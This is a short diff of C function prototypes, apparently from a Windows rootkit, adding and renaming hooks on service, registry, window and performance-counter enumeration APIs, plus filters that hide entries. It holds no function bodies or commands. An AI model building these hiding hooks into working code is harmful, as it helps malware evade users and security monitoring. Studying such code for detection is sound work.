@@ -29,9 +29,11 @@ static NTSTATUS NTAPI HookedNtQueryKey(HANDLE key, NT_KEY_INFORMATION_CLASS keyI
 static NTSTATUS NTAPI HookedNtEnumerateKey(HANDLE key, ULONG index, NT_KEY_INFORMATION_CLASS keyInformationClass, LPVOID keyInformation, ULONG keyInformationLength, PULONG resultLength);
 static NTSTATUS NTAPI HookedNtEnumerateValueKey(HANDLE key, ULONG index, NT_KEY_VALUE_INFORMATION_CLASS keyValueInformationClass, LPVOID keyValueInformation, ULONG keyValueInformationLength, PULONG resultLength);
 static NTSTATUS NTAPI HookedNtUserBuildHwndList(HDESK desktop, HWND hwndNext, BOOL enumChildren, BOOL removeImmersive, DWORD threadID, ULONG maxItems, HWND *itemBuffer, PULONG itemCount);
+static BOOL WINAPI HookedEnumServicesStatusA(SC_HANDLE serviceManager, DWORD serviceType, DWORD serviceState, LPENUM_SERVICE_STATUSA services, DWORD servicesLength, LPDWORD bytesNeeded, LPDWORD servicesReturned, LPDWORD resumeHandle);
+static BOOL WINAPI HookedEnumServicesStatusW(SC_HANDLE serviceManager, DWORD serviceType, DWORD serviceState, LPENUM_SERVICE_STATUSW services, DWORD servicesLength, LPDWORD bytesNeeded, LPDWORD servicesReturned, LPDWORD resumeHandle);
 static BOOL WINAPI HookedEnumServiceGroupW(SC_HANDLE serviceManager, DWORD serviceType, DWORD serviceState, LPBYTE services, DWORD servicesLength, LPDWORD bytesNeeded, LPDWORD servicesReturned, LPDWORD resumeHandle, LPVOID reserved);
-static BOOL WINAPI HookedEnumServicesStatusExW(SC_HANDLE serviceManager, SC_ENUM_TYPE infoLevel, DWORD serviceType, DWORD serviceState, LPBYTE services, DWORD servicesLength, LPDWORD bytesNeeded, LPDWORD servicesReturned, LPDWORD resumeHandle, LPCWSTR groupName);
 static BOOL WINAPI HookedEnumServicesStatusExA(SC_HANDLE serviceManager, SC_ENUM_TYPE infoLevel, DWORD serviceType, DWORD serviceState, LPBYTE services, DWORD servicesLength, LPDWORD bytesNeeded, LPDWORD servicesReturned, LPDWORD resumeHandle, LPCSTR groupName);
+static BOOL WINAPI HookedEnumServicesStatusExW(SC_HANDLE serviceManager, SC_ENUM_TYPE infoLevel, DWORD serviceType, DWORD serviceState, LPBYTE services, DWORD servicesLength, LPDWORD bytesNeeded, LPDWORD servicesReturned, LPDWORD resumeHandle, LPCWSTR groupName);
 static BOOL WINAPI HookedEnumServicesStatusExW2(SC_HANDLE serviceManager, SC_ENUM_TYPE infoLevel, DWORD serviceType, DWORD serviceState, LPBYTE services, DWORD servicesLength, LPDWORD bytesNeeded, LPDWORD servicesReturned, LPDWORD resumeHandle, LPCWSTR groupName);
 static NTSTATUS NTAPI HookedNtDeviceIoControlFile(HANDLE fileHandle, HANDLE event, PIO_APC_ROUTINE apcRoutine, LPVOID apcContext, PIO_STATUS_BLOCK ioStatusBlock, ULONG ioControlCode, LPVOID inputBuffer, ULONG inputBufferLength, LPVOID outputBuffer, ULONG outputBufferLength);
 static PDH_STATUS WINAPI HookedPdhGetRawCounterArrayW(PDH_HCOUNTER counter, LPDWORD bufferSize, LPDWORD itemCount, PNT_PDH_RAW_COUNTER_ITEM_W itemBuffer);
@@ -44,9 +46,10 @@ static LPWSTR CreatePath(LPWSTR result, LPCWSTR directoryName, LPCWSTR fileName)
 static LPWSTR FileInformationGetName(LPVOID fileInformation, FILE_INFORMATION_CLASS fileInformationClass, LPWSTR name);
 static ULONG FileInformationGetNextEntryOffset(LPVOID fileInformation, FILE_INFORMATION_CLASS fileInformationClass);
 static VOID FileInformationSetNextEntryOffset(LPVOID fileInformation, FILE_INFORMATION_CLASS fileInformationClass, ULONG value);
-static VOID FilterEnumServiceStatus(LPENUM_SERVICE_STATUSW services, LPDWORD servicesReturned);
-static VOID FilterEnumServiceStatusProcessW(LPENUM_SERVICE_STATUS_PROCESSW services, LPDWORD servicesReturned);
+static VOID FilterEnumServiceStatusA(LPENUM_SERVICE_STATUSA services, LPDWORD servicesReturned);
+static VOID FilterEnumServiceStatusW(LPENUM_SERVICE_STATUSW services, LPDWORD servicesReturned);
 static VOID FilterEnumServiceStatusProcessA(LPENUM_SERVICE_STATUS_PROCESSA services, LPDWORD servicesReturned);
+static VOID FilterEnumServiceStatusProcessW(LPENUM_SERVICE_STATUS_PROCESSW services, LPDWORD servicesReturned);
 static BOOL GetIsHiddenFromPdhString(LPCWSTR str);
 static DWORD GetProcessIdFromPdhString(LPCWSTR str);
 
